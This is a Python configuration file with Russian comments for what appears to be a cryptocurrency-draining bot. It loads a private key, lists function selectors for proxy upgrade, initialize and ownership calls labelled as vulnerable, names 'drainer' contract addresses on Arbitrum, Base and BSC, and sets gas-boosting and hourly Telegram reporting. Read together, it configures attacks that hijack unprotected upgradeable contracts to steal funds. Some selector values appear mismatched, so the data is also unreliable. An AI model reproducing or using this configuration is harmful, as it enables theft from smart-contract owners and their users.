import os
from dotenv import load_dotenv
load_dotenv()

# 🔐 Приватный ключ
PRIVATE_KEY = os.getenv("PRIVATE_KEY")

# ⚖️ Порог нативного баланса (ETH/BNB) в ETH
MIN_NATIVE_BALANCE = 0.005

# 🧠 Уязвимые сигнатуры функций (4byte)
VULNERABLE_SIGNATURES = {
    "upgradeTo": ["3659cfe6"],
    "upgradeToAndCall": ["f851a440"],
    "initialize": ["8129fc1c"],
    "changeAdmin": ["8f283970"],
    "transferOwnership": ["f2fde38b"],
    "setImplementation": ["79ba5097"],
}

# 🧲 Адреса дреинеров по сетям
DRAINER_ADDRESSES = {
    "arbitrum": "0x799d2575c824b5ee77cC926463b84826745Db3f1",
    "base":     "0x8eEbb02720952d269c609B589e13Af6152D35bDA",
    "bsc":      "0xf2a61790981AE64805cc9019670DD3C2499D77D0"
}

# ⚙️ Использовать ли upgradeToAndCall (True) или upgradeTo (False)
USE_UPGRADE_AND_CALL = True

# 🌐 Ссылки на обозреватели блоков
EXPLORERS = {
    "bsc": "https://bscscan.com/tx/",
    "arbitrum": "https://arbiscan.io/tx/",
    "base": "https://basescan.org/tx/"
}

# ⛽ Настройки газ-буста
GAS_BUMP_ENABLED = True            # Включить ли авто-буст газа
GAS_BUMP_PERCENT = 50              # Насколько % повышать (рекомендовано 20–50)

# 📊 Включить ли Telegram отчёт раз в час
TELEGRAM_HOURLY_REPORT_ENABLED = True
